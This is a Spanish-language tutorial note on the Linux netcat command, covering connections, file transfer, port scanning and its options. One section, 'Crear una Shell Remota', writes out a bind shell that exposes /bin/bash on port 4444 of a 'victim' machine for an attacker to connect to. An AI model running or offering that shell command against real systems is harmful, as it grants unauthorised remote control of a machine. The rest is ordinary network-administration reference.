#Comando #SistemaOperativo #Linux #Editar #Conexión #Redes #Archivos #Software 
# Comando `netcat` (`nc`) en [[Linux]]

## ¿Qué es `netcat`?

`netcat` (`nc`) es una herramienta de línea de comandos que permite leer y escribir datos a través de conexiones de red utilizando los protocolos [[TCP]] y [[UDP]]. Se usa comúnmente para:

- Diagnóstico y depuración de redes.
- Transferencia de archivos.
- Creación de servidores y clientes simples.
- Escaneo de puertos.

## Sintaxis

```sh
nc [opciones] [host] [puerto]
```

## Uso Básico

### 1. Conectarse a un Servidor TCP

```sh
nc ejemplo.com 80
```

Abre una conexión TCP al puerto 80 de `ejemplo.com`.

### 2. Crear un Servidor TCP

```sh
nc -l -p 1234
```

Escucha conexiones entrantes en el puerto `1234`.

### 3. Enviar un Mensaje entre Dos Máquinas

En la máquina receptora:

```sh
nc -l -p 1234
```

En la máquina emisora:

```sh
echo "Hola desde el cliente" | nc IP_DEL_SERVIDOR 1234
```

### 4. Transferir un Archivo

En la máquina receptora:

```sh
nc -l -p 1234 > archivo_recibido.txt
```

En la máquina emisora:

```sh
nc IP_DEL_SERVIDOR 1234 < archivo.txt
```

## Escaneo de Puertos

Para verificar si un puerto está abierto en una máquina:

```sh
nc -z -v IP_OBJETIVO 80
```

Para escanear un rango de puertos:

```sh
nc -z -v IP_OBJETIVO 20-1000
```

## Crear una Shell Remota

Desde la máquina víctima (con acceso):

```sh
nc -l -p 4444 -e /bin/bash
```

Desde la máquina atacante:

```sh
nc IP_VÍCTIMA 4444
```

⚠️ **Nota:** Esto puede ser usado de forma maliciosa, por lo que se debe tener precaución al permitir conexiones entrantes.

## Opciones Comunes

|Opción|Descripción|
|---|---|
|`-l`|Escucha conexiones entrantes (modo servidor).|
|`-p`|Especifica el puerto a usar.|
|`-v`|Muestra información detallada de la conexión.|
|`-z`|Escaneo de puertos sin enviar datos.|
|`-e`|Ejecuta un programa después de establecer la conexión.|
|`-u`|Usa el protocolo UDP en lugar de TCP.|

## Consideraciones

- `netcat` es una herramienta poderosa y debe usarse con responsabilidad.
- No cifra los datos enviados, por lo que no es seguro para información sensible.
- Se recomienda usar `ncat` (versión más segura de `netcat` incluida en `nmap`) para conexiones cifradas.